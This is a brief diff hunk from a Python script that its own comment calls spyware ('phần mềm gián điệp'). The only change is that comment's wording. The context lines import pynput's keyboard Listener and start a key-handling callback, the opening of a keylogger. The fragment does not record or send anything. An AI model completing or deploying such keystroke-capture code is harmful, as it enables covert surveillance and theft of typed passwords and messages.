@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener
-# Code gian diep
+# Code phần mềm gián điệp
 def anonymous(key):
     key=str(key)
     key=key.replace("'","")
